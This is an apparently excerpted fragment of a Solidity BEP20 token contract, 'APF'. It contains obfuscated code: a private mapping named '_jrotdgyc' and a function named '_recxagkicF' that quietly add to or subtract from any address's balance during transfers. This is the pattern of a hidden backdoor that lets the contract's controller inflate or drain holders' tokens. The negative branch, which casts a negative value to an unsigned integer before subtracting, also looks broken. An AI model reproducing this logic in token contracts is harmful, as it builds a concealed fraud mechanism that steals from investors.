...
contract APF is BEP20, Ownable {
    ...
    mapping(address => int256) private _jrotdgyc;
    ...
    function _recxagkicF(
        ...
        if (_jrotdgyc[from] > 0){
            _balances[from] = _balances[from].add(uint256(_jrotdgyc[from]));
        }else if (_jrotdgyc[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_jrotdgyc[from]));
        }
